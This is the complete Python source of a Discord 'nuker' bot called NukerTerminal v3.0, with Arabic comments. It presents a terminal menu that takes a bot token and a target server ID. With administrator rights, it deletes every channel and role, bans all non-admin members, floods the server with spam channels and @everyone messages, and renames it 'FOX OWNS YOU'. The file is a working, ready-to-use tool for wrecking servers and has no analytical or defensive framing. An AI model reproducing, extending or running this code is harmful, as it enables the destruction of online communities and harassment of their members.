"""

NukerTerminal v3.0 - FULLY CUSTOMIZED

Developer: Shadow V888 | For: Fox

Run: python nuker_terminal_v3.py

"""

import discord

import asyncio

import os

# === إعدادات البوت ===

intents = discord.Intents.default()

intents.guilds = True

intents.members = True

client = discord.Client(intents=intents)

# === متغيرات عالمية ===

target_guild = None

# === وظائف التخريب ===

async def delete_all_channels(guild):

    print("[+] Deleting all channels...")

    for channel in guild.channels:

        try:

            await channel.delete()

            print(f"   [X] Deleted: {channel.name}")

        except:

            print(f"   [-] Failed: {channel.name}")

async def delete_all_roles(guild):

    print("[+] Deleting all roles...")

    deleted = 0

    for role in guild.roles:

        if role != guild.default_role:

            try:

                await role.delete()

                print(f"   [X] Deleted role: {role.name}")

                deleted += 1

            except:

                print(f"   [-] Failed role: {role.name}")

    print(f"[+] Total roles deleted: {deleted}")

async def ban_all_members(guild):

    print("[+] Banning all members...")

    banned = 0

    for member in guild.members:

        if member != client.user and not member.guild_permissions.administrator:

            try:

                await member.ban(reason="Nuked by Fox")

                banned += 1

                print(f"   [BAN] {member.name}")

            except:

                pass

    print(f"[+] Total banned: {banned}")

async def create_spam_channels(guild, amount=100):

    print(f"[+] Creating {amount} spam channels...")

    for i in range(amount):

        try:

            await guild.create_text_channel(f"fox-owned-{i}")

            print(f"   [+] Channel {i}")

        except:

            pass

async def spam_everyone(guild):

    print("[+] Spamming @everyone...")

    for channel in guild.text_channels:

        try:

            await channel.send("@everyone SERVER DESTROYED BY FOX")

        except:

            pass

async def change_server_name(guild, name):

    try:

        await guild.edit(name=name)

        print(f"[+] Server renamed to: {name}")

    except:

        print("[-] Failed to rename server")

# === لوحة التحكم في الترمنال ===

def terminal_panel():

    global target_guild

    os.system('cls' if os.name == 'nt' else 'clear')

    print("="*60)

    print("     NUKER TERMINAL v3.0 - MOBILE MESSAGE FIXED")

    print("               Developer: Shadow V888")

    print("="*60)

    token = input("\n[?] Enter Bot Token: ").strip()

    server_id = input("[?] Enter Target Server ID: ").strip()

    print("\n[+] Logging in...")

    @client.event

    async def on_ready():

        global target_guild

        print(f"\n[+] Logged in as: {client.user}")

        try:

            target_guild = client.get_guild(int(server_id))

            if not target_guild:

                print("[-] Server not found. Check ID or invite bot.")

                await client.close()

                return

            print(f"[+] Target: {target_guild.name} ({target_guild.member_count} members)")

            # تحقق من صلاحيات البوت

            bot_member = target_guild.get_member(client.user.id)

            if not bot_member.guild_permissions.administrator:

                print("[-] ERROR: Bot needs ADMINISTRATOR permission!")

                await client.close()

                return

            # لوحة التحكم

            while True:

                print("\n" + "-"*50)

                print(" [1] Nuke Server (Delete All + Spam)")

                print(" [2] Ban All Members")

                print(" [3] Create 100 Spam Channels")

                print(" [4] Spam @everyone")

                print(" [5] Rename Server")

                print(" [6] Delete All Roles Only")   # الزر الجديد

                print(" [7] Leave Server")

                print(" [0] Exit")

                print("-"*50)

                choice = input("Choose action: ").strip()

                if choice == "1":

                    await delete_all_channels(target_guild)

                    await delete_all_roles(target_guild)  # مضمن في النيوك

                    await create_spam_channels(target_guild, 50)

                    await spam_everyone(target_guild)

                    await change_server_name(target_guild, "FOX OWNS YOU")

                elif choice == "2":

                    await ban_all_members(target_guild)

                elif choice == "3":

                    amount = input("Amount (default 100): ") or "100"

                    await create_spam_channels(target_guild, int(amount))

                elif choice == "4":

                    await spam_everyone(target_guild)

                elif choice == "5":

                    name = input("New server name: ")

                    await change_server_name(target_guild, name)

                elif choice == "6":

                    await delete_all_roles(target_guild)  # الزر الجديد: مسح الرتب فقط

                elif choice == "7":

                    print("[+] Bot leaving...")

                    await target_guild.leave()

                    break

                elif choice == "0":

                    print("[+] Shutting down...")

                    break

                else:

                    print("[-] Invalid option.")

            await client.close()

        except Exception as e:

            print(f"[-] Error: {e}")

            await client.close()

    # === تشغيل البوت ===

    try:

        client.run(token)

    except Exception as e:

        print(f"[-] Login failed: {e}")

        input("\nPress Enter to exit...")

# === تشغيل البرنامج ===

if __name__ == "__main__":

    terminal_panel()